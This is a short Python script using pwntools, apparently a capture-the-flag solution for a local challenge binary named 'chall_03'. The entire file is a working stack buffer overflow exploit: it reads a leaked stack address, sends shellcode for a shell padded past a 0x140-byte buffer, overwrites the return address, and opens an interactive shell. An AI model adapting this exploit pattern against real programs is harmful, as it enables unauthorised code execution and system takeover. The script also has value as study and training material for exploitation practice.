# coding: utf-8
from pwn import *
pr = process("./chall_03")
context.arch = "amd64"
pr.recvuntil(":)")
asm_shell = asm(shellcraft.sh())
length_shell = len(asm_shell)
ovr_flw = pr.recv()
payload = (asm_shell + b'A' * (0x140 - length_shell) + b'A' * 8 + p64(int(ovr_flw,16)))
pr.sendline(payload)
pr.interactive()
pr.close()
